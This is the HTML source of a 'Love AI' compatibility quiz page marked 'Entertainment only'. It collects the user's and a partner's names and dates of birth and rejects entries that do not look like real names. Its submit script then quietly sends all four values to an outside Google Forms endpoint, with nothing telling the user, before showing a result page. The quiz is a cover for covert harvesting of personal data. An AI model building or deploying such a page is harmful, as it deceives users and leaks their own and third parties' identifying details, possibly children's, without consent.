<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love AI</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,Arial;
  background:linear-gradient(135deg,#ff5f8a,#ff9acb);
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.card{
  background:#fff;
  width:100%;
  max-width:420px;
  padding:20px;
  border-radius:18px;
}
h1{text-align:center;color:#ff3d68}
label{font-size:14px;font-weight:600}
input{
  width:100%;
  padding:14px;
  margin:6px 0 14px;
  border-radius:12px;
  border:1px solid #ccc;
  font-size:16px;
}
button{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#ff3d68;
  color:#fff;
  font-size:18px;
}
small{
  font-size:9px;
  color:#aaa;
  display:block;
  text-align:center;
  margin-top:8px;
}
</style>
</head>

<body>
<div class="card">
<h1>Love AI ðŸ’–</h1>

<label>Your Name</label>
<input id="name1" placeholder="Your name">

<label>Your Date of Birth</label>
<input id="dob1" type="date">

<label>Partner Name</label>
<input id="name2" placeholder="Partner name">

<label>Partner Date of Birth</label>
<input id="dob2" type="date">

<button onclick="submitData()">See Predictions</button>

<small>Entertainment only</small>
</div>

<script>
function looksLikeHumanName(n){
  n=n.trim();
  return /^[A-Za-z][A-Za-z\s]{1,28}$/.test(n) && !/(.)\1{3,}/.test(n);
}

function ageFromDOB(d){
  const diff = Date.now() - new Date(d).getTime();
  return new Date(diff).getUTCFullYear() - 1970;
}

function submitData(){
  const n1=name1.value.trim();
  const n2=name2.value.trim();
  const d1=dob1.value;
  const d2=dob2.value;

  if(!looksLikeHumanName(n1) || !looksLikeHumanName(n2)){
    alert("This prediction is only for real couples.");
    return;
  }

  const a1=ageFromDOB(d1);
  const a2=ageFromDOB(d2);
  if(a1<9||a1>90||a2<9||a2>90){
    alert("Age must be between 9 and 90 years.");
    return;
  }

  const f1=new Date(d1);
  const f2=new Date(d2);

  fetch("https://docs.google.com/forms/d/e/9es4GVTLitR3TiEQ8/formResponse",{
    method:"POST",
    mode:"no-cors",
    body:new URLSearchParams({
      "entry.1091683725": n1,
      "entry.1966327274": n2,
      "entry.1974673221_year": f1.getFullYear(),
      "entry.1974673221_month": f1.getMonth()+1,
      "entry.1974673221_day": f1.getDate(),
      "entry.1430594721_year": f2.getFullYear(),
      "entry.1430594721_month": f2.getMonth()+1,
      "entry.1430594721_day": f2.getDate()
    })
  });

  sessionStorage.setItem("n1",n1);
  sessionStorage.setItem("n2",n2);

  location.href="result.html";
}
</script>
</body>
</html>
